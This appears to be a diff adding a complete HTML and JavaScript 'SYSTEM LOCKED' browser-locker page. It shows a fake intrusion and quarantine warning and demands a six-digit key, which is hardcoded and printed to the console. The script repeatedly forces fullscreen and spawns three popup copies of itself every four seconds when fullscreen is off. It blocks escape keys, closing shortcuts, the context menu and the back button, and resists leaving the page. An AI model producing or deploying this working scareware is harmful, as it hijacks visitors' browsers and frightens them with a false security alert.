@@ -1,0 +1,914 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYSTEM LOCKDOWN</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #000;
+            font-family: 'Courier New', 'Consolas', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+        }
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            pointer-events: none;
+            opacity: 0.06;
+            font-size: 14px;
+            color: #00ff41;
+            overflow: hidden;
+        }
+        .matrix-col {
+            position: absolute;
+            top: -100%;
+            white-space: nowrap;
+            animation: rain linear infinite;
+        }
+        @keyframes rain {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100vh); }
+        }
+        .lock-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(ellipse at center, #000800 0%, #000000 100%);
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .header-top {
+            text-align: center;
+            margin-bottom: 15px;
+            z-index: 2;
+        }
+        .header-skull {
+            font-size: 50px;
+            filter: drop-shadow(0 0 25px #ff0011);
+            animation: floatSkull 2.5s ease-in-out infinite;
+        }
+        @keyframes floatSkull {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-8px); }
+        }
+        .header-title {
+            color: #ff0011;
+            font-size: 26px;
+            font-weight: bold;
+            letter-spacing: 8px;
+            text-shadow: 0 0 30px #ff0011, 0 0 60px #ff0011;
+        }
+        .header-sub {
+            color: #006600;
+            font-size: 10px;
+            letter-spacing: 5px;
+            margin-top: 4px;
+        }
+        .lock-box {
+            background: #000600;
+            border: 1px solid #003300;
+            border-radius: 8px;
+            padding: 20px 22px;
+            text-align: center;
+            max-width: 400px;
+            width: 92%;
+            position: relative;
+            z-index: 2;
+            box-shadow: 0 0 40px rgba(0, 255, 65, 0.1), inset 0 0 30px rgba(0, 255, 65, 0.02);
+        }
+        .lock-box::after {
+            content: "";
+            position: absolute;
+            top: -1px;
+            left: -1px;
+            right: -1px;
+            bottom: -1px;
+            border: 1px solid #ff0011;
+            border-radius: 8px;
+            z-index: -1;
+            animation: borderFlash 0.6s infinite alternate;
+        }
+        @keyframes borderFlash {
+            0% { opacity: 0.2; }
+            100% { opacity: 0.7; }
+        }
+        .terminal-box {
+            background: #000300;
+            border: 1px solid #002200;
+            border-radius: 4px;
+            padding: 10px 12px;
+            margin-bottom: 10px;
+            text-align: left;
+        }
+        .terminal-line {
+            color: #00aa00;
+            font-size: 9px;
+            line-height: 1.7;
+            letter-spacing: 1px;
+        }
+        .terminal-line .prompt { color: #00ff41; }
+        .terminal-line .warn {
+            color: #ff0011;
+            font-weight: bold;
+            animation: blinkText 0.7s infinite;
+        }
+        @keyframes blinkText {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        .info-row {
+            display: flex;
+            gap: 6px;
+            margin-bottom: 10px;
+        }
+        .info-cell {
+            flex: 1;
+            background: #000300;
+            border: 1px solid #002200;
+            border-radius: 3px;
+            padding: 6px 4px;
+            text-align: center;
+        }
+        .info-label {
+            color: #004400;
+            font-size: 7px;
+            letter-spacing: 2px;
+        }
+        .info-val {
+            color: #00ff41;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        .info-val.red {
+            color: #ff0011;
+            animation: blinkText 0.5s infinite;
+        }
+        .info-val.yellow {
+            color: #ffaa00;
+        }
+        .pass-display {
+            width: 100%;
+            padding: 10px;
+            background: #000200;
+            border: 1px solid #003300;
+            border-radius: 4px;
+            color: #00ff41;
+            font-size: 24px;
+            text-align: center;
+            letter-spacing: 8px;
+            font-family: 'Courier New', monospace;
+            margin-bottom: 10px;
+            min-height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-shadow: 0 0 10px #00ff41;
+            transition: all 0.3s;
+        }
+        .pass-display .blink-cursor {
+            animation: cursorFlash 0.6s infinite;
+        }
+        @keyframes cursorFlash {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        .numpad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 6px;
+            margin-bottom: 8px;
+        }
+        .numpad button {
+            padding: 12px 4px;
+            background: #000800;
+            border: 1px solid #002200;
+            border-radius: 4px;
+            color: #00ff41;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            transition: all 0.15s;
+            text-shadow: 0 0 5px #00ff41;
+        }
+        .numpad button:hover {
+            background: #001a00;
+            border-color: #00ff41;
+            box-shadow: 0 0 12px rgba(0,255,65,0.3);
+        }
+        .numpad button:active {
+            background: #00ff41;
+            color: #000;
+            text-shadow: none;
+            transform: scale(0.9);
+        }
+        .numpad .btn-clr {
+            color: #ff0011;
+            border-color: #220000;
+            font-size: 10px;
+            letter-spacing: 2px;
+        }
+        .numpad .btn-clr:hover {
+            border-color: #ff0011;
+            box-shadow: 0 0 12px rgba(255,0,17,0.4);
+        }
+        .numpad .btn-clr:active {
+            background: #ff0011;
+            color: #fff;
+        }
+        .numpad .btn-go {
+            color: #00ff41;
+            border-color: #003300;
+            font-size: 10px;
+            letter-spacing: 2px;
+            background: #001100;
+        }
+        .numpad .btn-go:hover {
+            border-color: #00ff41;
+            box-shadow: 0 0 15px rgba(0,255,65,0.5);
+        }
+        .numpad .btn-go:active {
+            background: #00ff41;
+            color: #000;
+        }
+        .status {
+            color: #ff0011;
+            font-size: 9px;
+            min-height: 12px;
+            letter-spacing: 2px;
+            font-weight: bold;
+        }
+        .status.green { color: #00ff41; }
+        .status.yellow { color: #ffaa00; }
+        .spawn-badge {
+            display: inline-block;
+            background: #220000;
+            border: 1px solid #ff0011;
+            border-radius: 3px;
+            padding: 3px 10px;
+            font-size: 9px;
+            color: #ff4444;
+            margin-top: 8px;
+            letter-spacing: 1px;
+            animation: pulseBadge 0.8s infinite;
+        }
+        @keyframes pulseBadge {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+        .success-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 99999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .success-icon {
+            font-size: 60px;
+            filter: drop-shadow(0 0 30px #00ff41);
+            margin-bottom: 10px;
+        }
+        .success-title {
+            color: #00ff41;
+            font-size: 26px;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 6px;
+            text-shadow: 0 0 40px #00ff41;
+        }
+        .success-sub {
+            color: #006600;
+            font-size: 10px;
+            margin-top: 5px;
+            letter-spacing: 3px;
+        }
+        .btn-restore {
+            margin-top: 25px;
+            padding: 12px 35px;
+            background: #001a00;
+            border: 1px solid #00ff41;
+            border-radius: 5px;
+            color: #00ff41;
+            font-size: 13px;
+            cursor: pointer;
+            letter-spacing: 4px;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        .btn-restore:hover {
+            background: #00ff41;
+            color: #000;
+            box-shadow: 0 0 30px rgba(0,255,65,0.6);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="matrix-bg" id="matrixBg"></div>
+
+    <div class="lock-overlay" id="lockOverlay">
+        <div class="header-top">
+            <div class="header-skull">&#9760;</div>
+            <div class="header-title">SYSTEM LOCKED</div>
+            <div class="header-sub">&#9608;&#9608; ROOT ACCESS REQUIRED &#9608;&#9608;</div>
+        </div>
+
+        <div class="lock-box">
+            <div class="terminal-box">
+                <div class="terminal-line">
+                    <span class="prompt">root@kernel:~$</span> intrusion detected<br>
+                    <span class="prompt">root@kernel:~$</span> browser <span class="warn">QUARANTINED</span><br>
+                    <span class="prompt">root@kernel:~$</span> enter key to <span class="warn">UNLOCK</span>
+                </div>
+            </div>
+
+            <div class="info-row">
+                <div class="info-cell">
+                    <div class="info-label">STATUS</div>
+                    <div class="info-val red">LOCKED</div>
+                </div>
+                <div class="info-cell">
+                    <div class="info-label">FULLSCREEN</div>
+                    <div class="info-val red" id="fsStatus">ON</div>
+                </div>
+                <div class="info-cell">
+                    <div class="info-label">TABS</div>
+                    <div class="info-val yellow" id="tabCount">0</div>
+                </div>
+            </div>
+
+            <div class="pass-display" id="passDisplay">
+                <span id="passDots"></span><span class="blink-cursor">&#9608;</span>
+            </div>
+
+            <div class="numpad">
+                <button onclick="press('1')">1</button>
+                <button onclick="press('2')">2</button>
+                <button onclick="press('3')">3</button>
+                <button onclick="press('4')">4</button>
+                <button onclick="press('5')">5</button>
+                <button onclick="press('6')">6</button>
+                <button onclick="press('7')">7</button>
+                <button onclick="press('8')">8</button>
+                <button onclick="press('9')">9</button>
+                <button class="btn-clr" onclick="clearLast()">CLR</button>
+                <button onclick="press('0')">0</button>
+                <button class="btn-go" onclick="submitPass()">&#9166; GO</button>
+            </div>
+
+            <div class="status" id="statusMsg"></div>
+            <div class="spawn-badge" id="spawnBadge" style="display:none;">&#9888; FULLSCREEN OFF - SPAWNING 3 TABS EVERY 4s</div>
+        </div>
+    </div>
+
+    <div class="success-overlay" id="successOverlay">
+        <div class="success-icon">&#10004;</div>
+        <div class="success-title">ACCESS GRANTED</div>
+        <div class="success-sub">System restored. Browser unlocked.</div>
+        <button class="btn-restore" onclick="restoreAll()">
+            &#9655; EXIT LOCKDOWN &#9665;
+        </button>
+    </div>
+
+    <script>
+        // ============================================
+        // CONFIG
+        // ============================================
+        const PASSWORD = "089089";
+        const MAX_LEN = 6;
+        const SPAWN_INTERVAL = 4000;
+        const TABS_PER_SPAWN = 3;
+        let input = "";
+        let unlocked = false;
+        let tries = 0;
+        let lockTimer = null;
+        let totalTabsSpawned = 0;
+        let spawnTimerId = null;
+        let isFullscreen = false;
+        let isParentTab = false;
+        const TAB_ID = "tab_" + Date.now() + "_" + Math.random().toString(36).substr(2, 8);
+        let broadcastChannel = null;
+
+        // ============================================
+        // BROADCAST CHANNEL
+        // ============================================
+        try {
+            broadcastChannel = new BroadcastChannel("lockdown_system_v3");
+        } catch (e) {
+            broadcastChannel = null;
+        }
+
+        // ============================================
+        // IDENTIFIKASI PARENT TAB
+        // ============================================
+        if (!localStorage.getItem("lockdown_parent_id")) {
+            localStorage.setItem("lockdown_parent_id", TAB_ID);
+            isParentTab = true;
+            localStorage.setItem("lockdown_tab_count", "0");
+        } else {
+            isParentTab = false;
+            const stored = parseInt(localStorage.getItem("lockdown_tab_count") || "0");
+            totalTabsSpawned = stored;
+        }
+
+        // ============================================
+        // BROADCAST LISTENER
+        // ============================================
+        if (broadcastChannel) {
+            broadcastChannel.onmessage = function(event) {
+                const data = event.data;
+                if (data.action === "unlock_all") {
+                    handleRemoteUnlock();
+                }
+                if (data.action === "close_children") {
+                    if (!isParentTab) {
+                        try { window.close(); } catch (e) {}
+                    }
+                }
+                if (data.action === "update_count") {
+                    totalTabsSpawned = data.count;
+                    document.getElementById("tabCount").textContent = totalTabsSpawned;
+                }
+            };
+        }
+
+        // ============================================
+        // STORAGE LISTENER
+        // ============================================
+        window.addEventListener("storage", function(e) {
+            if (e.key === "lockdown_unlocked" && e.newValue === "true") {
+                handleRemoteUnlock();
+            }
+            if (e.key === "lockdown_tab_count") {
+                const c = parseInt(e.newValue || "0");
+                if (c > totalTabsSpawned) {
+                    totalTabsSpawned = c;
+                    document.getElementById("tabCount").textContent = totalTabsSpawned;
+                }
+            }
+        });
+
+        function handleRemoteUnlock() {
+            unlocked = true;
+            stopSpawning();
+            if (!isParentTab) {
+                setTimeout(() => { try { window.close(); } catch (e) {} }, 500);
+            } else {
+                document.getElementById("successOverlay").style.display = "flex";
+            }
+        }
+
+        // ============================================
+        // MATRIX RAIN
+        // ============================================
+        (function createRain() {
+            const box = document.getElementById("matrixBg");
+            const chars = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+            for (let i = 0; i < 35; i++) {
+                const col = document.createElement("div");
+                col.className = "matrix-col";
+                col.style.left = (i * 2.8) + "%";
+                col.style.animationDuration = (Math.random() * 4 + 3) + "s";
+                col.style.animationDelay = (Math.random() * 3) + "s";
+                col.style.fontSize = (Math.random() * 8 + 11) + "px";
+                let txt = "";
+                for (let j = 0; j < 25; j++) {
+                    txt += chars[Math.floor(Math.random() * chars.length)] + "<br>";
+                }
+                col.innerHTML = txt;
+                box.appendChild(col);
+            }
+        })();
+
+        // ============================================
+        // FULLSCREEN DETECTION
+        // ============================================
+        function checkFullscreenStatus() {
+            const fs = !!(
+                document.fullscreenElement ||
+                document.webkitFullscreenElement ||
+                document.msFullscreenElement
+            );
+            isFullscreen = fs;
+            updateFSDisplay();
+            return fs;
+        }
+
+        function updateFSDisplay() {
+            const fsEl = document.getElementById("fsStatus");
+            const badge = document.getElementById("spawnBadge");
+            if (isFullscreen) {
+                fsEl.textContent = "ON";
+                fsEl.className = "info-val";
+                fsEl.style.color = "#00ff41";
+                badge.style.display = "none";
+            } else {
+                fsEl.textContent = "OFF";
+                fsEl.className = "info-val red";
+                fsEl.style.color = "#ff0011";
+                badge.style.display = "inline-block";
+            }
+        }
+
+        // ============================================
+        // TAB SPAWNING - HANYA PARENT, HANYA SAAT FS OFF
+        // ============================================
+        function spawnTabs() {
+            if (unlocked) return;
+            if (!isParentTab) return;
+
+            const fs = checkFullscreenStatus();
+
+            if (!fs) {
+                for (let i = 0; i < TABS_PER_SPAWN; i++) {
+                    try {
+                        const newTab = window.open(
+                            window.location.href,
+                            "_blank",
+                            "width=400,height=380,top=" + (Math.random() * 200 + 30) + ",left=" + (Math.random() * 200 + 30)
+                        );
+                        if (newTab) {
+                            totalTabsSpawned++;
+                        }
+                    } catch (e) {
+                        try {
+                            const link = document.createElement("a");
+                            link.href = window.location.href;
+                            link.target = "_blank";
+                            link.rel = "noopener noreferrer";
+                            link.style.display = "none";
+                            document.body.appendChild(link);
+                            link.click();
+                            document.body.removeChild(link);
+                            totalTabsSpawned++;
+                        } catch (e2) {}
+                    }
+                }
+
+                localStorage.setItem("lockdown_tab_count", totalTabsSpawned.toString());
+                document.getElementById("tabCount").textContent = totalTabsSpawned;
+
+                if (broadcastChannel) {
+                    broadcastChannel.postMessage({ action: "update_count", count: totalTabsSpawned });
+                }
+
+                const statEl = document.getElementById("statusMsg");
+                if (!unlocked && !lockTimer) {
+                    statEl.className = "status yellow";
+                    statEl.textContent = "[ SPAWN ] +" + TABS_PER_SPAWN + " tabs | Total: " + totalTabsSpawned;
+                }
+            }
+        }
+
+        function startSpawning() {
+            if (!isParentTab) return;
+            if (spawnTimerId) clearInterval(spawnTimerId);
+            spawnTimerId = setInterval(() => {
+                spawnTabs();
+            }, SPAWN_INTERVAL);
+        }
+
+        function stopSpawning() {
+            if (spawnTimerId) {
+                clearInterval(spawnTimerId);
+                spawnTimerId = null;
+            }
+        }
+
+        // ============================================
+        // PASSWORD HANDLING
+        // ============================================
+        function press(d) {
+            if (unlocked || lockTimer) return;
+            if (input.length < MAX_LEN) {
+                input += d;
+                drawDots();
+            }
+        }
+
+        function clearLast() {
+            if (unlocked || lockTimer) return;
+            input = input.slice(0, -1);
+            drawDots();
+        }
+
+        function drawDots() {
+            const el = document.getElementById("passDots");
+            let h = "";
+            for (let i = 0; i < input.length; i++) h += "&#9679;";
+            for (let i = input.length; i < MAX_LEN; i++) h += "&#183;";
+            el.innerHTML = h;
+        }
+
+        // ============================================
+        // SUBMIT
+        // ============================================
+        function submitPass() {
+            if (unlocked || lockTimer) return;
+
+            const stat = document.getElementById("statusMsg");
+            const disp = document.getElementById("passDisplay");
+            tries++;
+
+            if (input === PASSWORD) {
+                unlocked = true;
+                stopSpawning();
+                stat.className = "status green";
+                stat.textContent = "[ OK ] KEY ACCEPTED";
+                disp.style.borderColor = "#00ff41";
+                disp.style.boxShadow = "0 0 25px rgba(0,255,65,0.5)";
+                freezeNumpad();
+
+                localStorage.setItem("lockdown_unlocked", "true");
+                localStorage.setItem("lockdown_unlock_time", Date.now().toString());
+
+                if (broadcastChannel) {
+                    broadcastChannel.postMessage({ action: "unlock_all" });
+                }
+
+                setTimeout(() => {
+                    document.getElementById("successOverlay").style.display = "flex";
+                }, 700);
+            } else {
+                stat.className = "status";
+                stat.textContent = "[ ERR ] INVALID KEY";
+                disp.style.borderColor = "#ff0011";
+                disp.style.boxShadow = "0 0 25px rgba(255,0,17,0.5)";
+                shakeIt();
+                setTimeout(() => {
+                    input = "";
+                    drawDots();
+                    disp.style.borderColor = "#003300";
+                    disp.style.boxShadow = "none";
+                    stat.textContent = "";
+                }, 450);
+                if (tries >= 12) {
+                    lockTimer = setTimeout(() => {
+                        lockTimer = null;
+                        tries = 0;
+                        stat.textContent = "";
+                    }, 90000);
+                    stat.textContent = "[ LOCK ] WAIT 90 SECONDS";
+                    freezeNumpad();
+                }
+            }
+        }
+
+        function freezeNumpad() {
+            document.querySelectorAll(".numpad button").forEach(b => {
+                b.disabled = true;
+                b.style.opacity = "0.35";
+                b.style.pointerEvents = "none";
+            });
+        }
+
+        function shakeIt() {
+            const ov = document.getElementById("lockOverlay");
+            ov.style.animation = "none";
+            ov.offsetHeight;
+            ov.style.animation = "shake 0.4s ease";
+            setTimeout(() => { ov.style.animation = ""; }, 400);
+        }
+
+        // ============================================
+        // RESTORE
+        // ============================================
+        function restoreAll() {
+            if (broadcastChannel) {
+                broadcastChannel.postMessage({ action: "close_children" });
+            }
+
+            document.getElementById("lockOverlay").style.display = "none";
+            document.getElementById("successOverlay").style.display = "none";
+            document.getElementById("matrixBg").style.display = "none";
+            document.body.style.background = "#111";
+            document.body.innerHTML = `
+                <div style="display:flex;justify-content:center;align-items:center;height:100vh;
+                font-family:'Courier New',monospace;text-align:center;flex-direction:column;">
+                    <div style="color:#00ff41;font-size:22px;letter-spacing:5px;">
+                        &#10004; SYSTEM RESTORED
+                    </div>
+                    <div style="color:#555;font-size:10px;margin-top:8px;letter-spacing:2px;">
+                        All browser functions normal. All spawned tabs closed.
+                    </div>
+                    <button onclick="location.reload()" style="
+                        margin-top:20px;padding:10px 28px;background:#001a00;
+                        border:1px solid #00ff41;color:#00ff41;
+                        font-family:'Courier New',monospace;cursor:pointer;
+                        font-size:12px;letter-spacing:3px;border-radius:3px;
+                    ">RELOAD</button>
+                </div>
+            `;
+
+            setTimeout(() => {
+                localStorage.removeItem("lockdown_parent_id");
+                localStorage.removeItem("lockdown_unlocked");
+                localStorage.removeItem("lockdown_unlock_time");
+                localStorage.removeItem("lockdown_tab_count");
+            }, 1000);
+        }
+
+        // ============================================
+        // FULLSCREEN
+        // ============================================
+        function goFull() {
+            if (unlocked) return;
+            const e = document.documentElement;
+            try { e.requestFullscreen(); } catch (_) {}
+            try { e.webkitRequestFullscreen(); } catch (_) {}
+            try { e.msRequestFullscreen(); } catch (_) {}
+        }
+
+        // ============================================
+        // ANTI-ESCAPE
+        // ============================================
+        document.addEventListener("visibilitychange", () => {
+            if (unlocked) return;
+            if (document.hidden) {
+                setTimeout(() => { window.focus(); goFull(); }, 50);
+            }
+        });
+
+        window.addEventListener("blur", () => {
+            if (unlocked) return;
+            setTimeout(() => { window.focus(); goFull(); }, 50);
+        });
+
+        window.addEventListener("focus", () => {
+            if (!unlocked) {
+                goFull();
+                checkFullscreenStatus();
+            }
+        });
+
+        document.addEventListener("fullscreenchange", () => {
+            if (unlocked) return;
+            checkFullscreenStatus();
+            if (!isFullscreen) {
+                setTimeout(goFull, 80);
+            }
+        });
+
+        document.addEventListener("webkitfullscreenchange", () => {
+            if (unlocked) return;
+            checkFullscreenStatus();
+            if (!isFullscreen) {
+                setTimeout(goFull, 80);
+            }
+        });
+
+        // ============================================
+        // KEY BLOCK
+        // ============================================
+        document.addEventListener("keydown", e => {
+            if (unlocked) return;
+
+            const block = [
+                "F12","F11","Escape",
+                { c: true, k: "w" },{ c: true, k: "W" },
+                { c: true, k: "t" },{ c: true, k: "T" },
+                { c: true, k: "n" },{ c: true, k: "N" },
+                { c: true, k: "r" },{ c: true, k: "R" },
+                { c: true, k: "h" },{ c: true, k: "H" },
+                { c: true, k: "u" },{ c: true, k: "U" },
+                { c: true, k: "s" },{ c: true, k: "S" },
+                { c: true, k: "p" },{ c: true, k: "P" },
+                { c: true, k: "j" },{ c: true, k: "J" },
+                { c: true, k: "Tab" },
+                { a: true, k: "Tab" },
+                { a: true, k: "F4" },
+                { c: true, s: true, k: "T" },
+                { c: true, s: true, k: "N" },
+                { c: true, s: true, k: "W" },
+                { c: true, s: true, k: "Q" },
+                { m: true, k: "q" },{ m: true, k: "Q" },
+                { m: true, k: "w" },{ m: true, k: "W" },
+                { m: true, k: "t" },{ m: true, k: "T" },
+                { m: true, k: "n" },{ m: true, k: "N" },
+            ];
+
+            for (const b of block) {
+                let hit = true;
+                if (b.c !== undefined && b.c !== e.ctrlKey) hit = false;
+                if (b.a !== undefined && b.a !== e.altKey) hit = false;
+                if (b.s !== undefined && b.s !== e.shiftKey) hit = false;
+                if (b.m !== undefined && b.m !== e.metaKey) hit = false;
+                if (b.k !== undefined && b.k.toLowerCase() !== e.key.toLowerCase()) hit = false;
+                if (typeof b === "string" && b === e.key) hit = true;
+                if (hit) { e.preventDefault(); e.stopPropagation(); return false; }
+            }
+
+            if (e.key >= "0" && e.key <= "9") { e.preventDefault(); press(e.key); return; }
+            if (e.key === "Backspace" || e.key === "Delete") { e.preventDefault(); clearLast(); return; }
+            if (e.key === "Enter") { e.preventDefault(); submitPass(); return; }
+
+            e.preventDefault();
+        });
+
+        document.addEventListener("contextmenu", e => { if (!unlocked) e.preventDefault(); });
+        document.addEventListener("selectstart", e => { if (!unlocked) e.preventDefault(); });
+        document.addEventListener("dragstart", e => { if (!unlocked) e.preventDefault(); });
+
+        window.addEventListener("beforeunload", e => {
+            if (!unlocked) { e.preventDefault(); e.returnValue = ""; return ""; }
+        });
+
+        window.addEventListener("popstate", () => {
+            if (!unlocked) {
+                history.pushState(null, "", location.href);
+                goFull();
+            }
+        });
+
+        // ============================================
+        // CSS SHAKE
+        // ============================================
+        const shakeStyle = document.createElement("style");
+        shakeStyle.textContent = `
+            @keyframes shake {
+                0%,100%{transform:translate(0)}
+                10%{transform:translate(-6px,2px)}
+                30%{transform:translate(6px,-2px)}
+                50%{transform:translate(-4px,-1px)}
+                70%{transform:translate(4px,1px)}
+                90%{transform:translate(-2px,0)}
+            }
+        `;
+        document.head.appendChild(shakeStyle);
+
+        // ============================================
+        // INIT
+        // ============================================
+        function init() {
+            if (localStorage.getItem("lockdown_unlocked") === "true") {
+                const ut = parseInt(localStorage.getItem("lockdown_unlock_time") || "0");
+                if (Date.now() - ut < 300000) {
+                    unlocked = true;
+                    document.getElementById("successOverlay").style.display = "flex";
+                    return;
+                } else {
+                    localStorage.removeItem("lockdown_unlocked");
+                    localStorage.removeItem("lockdown_unlock_time");
+                }
+            }
+
+            goFull();
+
+            for (let i = 0; i < 10; i++) {
+                history.pushState(null, "", location.href);
+            }
+
+            drawDots();
+            document.getElementById("tabCount").textContent = totalTabsSpawned;
+
+            if (isParentTab) {
+                startSpawning();
+            }
+
+            setInterval(() => {
+                if (!unlocked) {
+                    checkFullscreenStatus();
+                    if (document.hidden) { window.focus(); goFull(); }
+                    if (!isFullscreen) goFull();
+                }
+            }, 500);
+
+            console.log("%c[ SYSTEM LOCKED ]", "color:red; font-size:30px;");
+            console.log("%cKey: 089089", "color:yellow; font-size:15px;");
+            console.log("%cSpawn: 3 tabs every 4s (only when FS off)", "color:orange;");
+            console.log("%cAll spawned tabs contain this same lock page", "color:lime;");
+        }
+
+        init();
+    </script>
+</body>
+</html>
